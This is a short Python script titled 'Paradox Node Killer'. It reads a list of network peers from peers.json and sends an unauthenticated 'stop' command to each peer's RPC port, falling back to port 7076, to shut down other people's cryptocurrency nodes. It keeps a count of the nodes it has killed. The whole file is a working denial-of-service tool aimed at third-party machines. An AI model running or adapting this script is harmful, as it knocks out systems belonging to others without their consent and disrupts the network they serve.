# Paradox Node Killer
import json
import requests
import os
import os.path

# global vars
killed = 0

def stopNode(node_url, node_port):
    print('attempting to kill: ', node_url, node_port)
    try:
        url = 'http://{0}:{1}'.format(node_url, node_port)
        res = requests.post(url, json={'action': 'stop'}, timeout=0.3)
        if res.ok:
            return res.json()
        else:
            return {'status': 'failed'}
    except:
        return {'status': 'failed'}

# read json file and decode it
def readJson(filename):
    with open(filename) as f:
        return json.load(f)

peers = []

if os.path.exists('peers.json'):
    peers = readJson('peers.json')

if len(peers) > 0:
    for peer in peers:
        address = peer.split(']')
        port = int(address[1].replace(':', ''))
        port = port + 1
        address = address[0].replace('[', '').replace('::ffff:', '')
        res = stopNode(address, port)
        if 'success' in res:
            print('killed node: ', address, port)
            killed = killed + 1
        elif 'status' in res and port != 7076:
            res = stopNode(address, 7076)
            if 'success' in res:
                print('killed node: ', address, 7076)
                killed = killed + 1

print('killed nodes: ', killed)
